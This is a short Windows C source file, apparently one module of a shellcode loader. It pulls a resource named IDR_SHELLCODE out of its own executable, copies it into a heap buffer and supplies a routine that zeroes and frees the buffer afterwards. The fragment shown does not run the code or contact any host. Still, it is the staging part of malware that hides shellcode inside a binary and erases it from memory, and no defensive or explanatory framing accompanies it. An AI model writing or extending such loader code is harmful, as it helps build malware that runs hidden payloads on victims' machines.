#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "payload.h"
#include "resource.h"

unsigned char *ldr_extract_shellcode(size_t *out_len) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_SHELLCODE), RT_RCDATA);
    if (!hRes) return NULL;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return NULL;

    DWORD sz = SizeofResource(NULL, hRes);
    if (sz == 0) return NULL;

    void *locked = LockResource(hData);
    if (!locked) return NULL;

    unsigned char *buf = (unsigned char *)malloc(sz);
    if (!buf) return NULL;

    memcpy(buf, locked, sz);
    *out_len = sz;
    return buf;
}

void ldr_wipe(unsigned char *buf, size_t len) {
    SecureZeroMemory(buf, len);
    free(buf);
}
